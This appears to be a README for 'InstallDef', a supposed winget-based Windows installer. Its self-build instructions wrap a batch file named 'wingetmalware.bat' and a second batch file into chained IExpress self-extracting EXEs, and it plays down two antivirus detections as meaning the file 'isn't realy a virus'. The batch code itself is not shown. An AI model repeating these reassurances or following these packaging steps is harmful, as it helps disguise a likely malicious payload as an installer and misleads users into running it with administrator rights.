# InstallDef
Open source installer for all your computer program needs

Hi dear reader, you might read this not knowing what to do next and or not having a critical component for this to work
I'm going to write down what you need to do, if i mistipe anything please know english is not my first language 

So let's begin 

𝐈𝐟 𝐲𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚 𝐜𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐜𝐨𝐦𝐩𝐨𝐧𝐞𝐧𝐭 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐏𝐂 𝐟𝐨𝐫 𝐭𝐡𝐢𝐬 𝐭𝐨 𝐰𝐨𝐫𝐤: 
You need to update your PC, windows package manager automaticly comes with a windows update 
When you updated your pc you can start an administrative command prompt and type this command in:
winget 
If you have no errors and a bunch of text explaining how winget works then you should have everything sorted


𝐈 𝐝𝐨𝐧'𝐭 𝐭𝐫𝐮𝐬𝐭 𝐭𝐡𝐢𝐬 𝐩𝐫𝐨𝐠𝐫𝐚𝐦
You can scan this file using virustotal, i scanned it already it has 2 detections whitch means this isn't realy a virus 
If you still don't trust virustotal then you can look at the project's github and compile the whole thing yourself

𝐓𝐡𝐞 𝐩𝐫𝐨𝐠𝐫𝐚𝐦 𝐣𝐮𝐬𝐭 𝐝𝐨𝐞𝐬𝐧'𝐭 𝐰𝐨𝐫𝐤
Try reinstalling the EXE or wait for a fix

How to compile the code for yourself: 
download wingetmalware.bat and winget2.bat
Run IExpress, create a new self extraction directive file
Click next until you get to package title, name it something
Add a comfirmation prompt, and do not display a license
Add the wingetmalware.bat as a package file and write this into the install program path: cmd /c wingetmalware.bat
Press next until package name and options save it somewhere

The next part is doing this but with the winget2.bat
Just don't ad a comfirmation prompt and add the EXE that you created to the package files
paste this into install program: cmd /c winget2.bat
and select post install command to be your EXE 
